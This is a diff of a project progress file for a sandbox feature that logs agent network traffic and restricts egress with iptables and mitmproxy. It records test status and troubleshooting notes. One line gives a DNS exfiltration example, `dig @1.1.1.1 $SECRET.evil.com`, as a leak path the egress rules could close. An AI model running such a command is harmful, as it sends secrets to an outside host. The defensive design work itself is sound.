@@ -4,12 +4,43 @@
 - **Project Type**: Brownfield
 - **Feature**: M7 — `--audit` network audit log (+ G6 egress allow-list)
 - **Start Date**: 2026-08-11T13:36:55Z
-- **Last Updated**: 2026-11-01
+- **Last Updated**: 2026-11-17
 - **Branch**: `feature/audit-inception`
-- **Current Stage**: CONSTRUCTION — completion plan, **Batch 1 done and
-  live-verified (2026-11-01); Batch 2 next**
+- **Current Stage**: CONSTRUCTION — completion plan, **Batch 2 implemented
+  (2026-11-17), awaiting the host smoke run** (`tests/smoke/audit-batch2.sh`)
 
-## ▶ RESUME POINT (next session) — start Batch 2
+## ▶ RESUME POINT — Batch 2 awaiting the host smoke run
+
+**State (2026-11-17):** Batch 2 steps 1–6 are committed (`d752807` rules +
+sysctls + decrypt port scope, `63a57eb` blocked record, `7d3b6a2` wording,
+`aee9f8d` smoke script). Dev checks green: 65/65 bats, 47 python tests,
+shellcheck clean apart from the old SC2004, `sh -n`/`bash -n`; the smoke
+script was run against a fake docker (30/30 good, expected FAILs with a
+Batch 1-style gateway). **Nothing is verified in a real container yet.** The
+user runs `tests/smoke/audit-batch2.sh` on the host and reports back. No image
+rebuild expected: the gateway image installs Debian's `iptables` package,
+which ships `ip6tables` too; the script's preflight checks this and prints
+`./build.sh --audit-gateway` if not.
+
+**What to look at if the smoke run fails:**
+- Gateway never healthy → `docker logs` of `…-audit-gw-1`: an `ip6tables`/
+  `iptables` error (the `comment` match, `REJECT --reject-with` types), or
+  "IPv6 is not disabled" (compose sysctls not applied; or a host kernel booted
+  with `ipv6.disable=1`, where the sysctl doesn't exist and docker refuses
+  to create the container: then the IPv6 sysctls need a conditional).
+- All TCP broken → the filter `-p tcp -j ACCEPT`/`-o lo` assumption (redirected
+  packets leave via lo) is wrong; check `iptables -L TRIGON_EGRESS -v -n` counters.
+- tcp/22 hangs → mitmproxy isn't passing server-speaks-first through (should
+  not happen with `ignore_hosts=.*`).
+- No blocked record → `done()` not reached, or iptables listing failed (the
+  record's `error` says which).
+
+**Open choice noted for the user:** udp/53 is allowed to *any* resolver, as
+the brief says. Allowing only Docker's embedded resolver (127.0.0.11, via lo)
+would also close `dig @1.1.1.1 $SECRET.evil.com` before Batch 3, and should
+not break normal resolution. Not done without asking.
+
+### Batch 2 brief (as planned, 2026-11-01)
 
 **State:** Batch 1 is committed (`8a328c3`, `cbcf4a6`, `156104e`, `cc2135b`) and
 passed the host smoke test 18/18. The plan and decisions are approved (UDP/QUIC
@@ -149,6 +180,9 @@ location (issue 2) and support concurrent sessions. Batches in order:
     edit/delete/reorder is detected) and `audit.bats`.
 
 **Batch 2 — coverage (needs live checks on the user's Docker):**
+- **Progress (2026-11-17):** steps 1–6 implemented and committed; dev checks
+  green; host smoke run (`tests/smoke/audit-batch2.sh`) pending. Details in
+  the RESUME POINT at the top.
 - Redirect **all** agent TCP (not just 80/443) to mitmproxy; keep loopback and the
   gateway uid excluded. Destination-only mode passes everything through
   immediately (`ignore_hosts=.*`), so server-speaks-first protocols (SSH, SMTP,
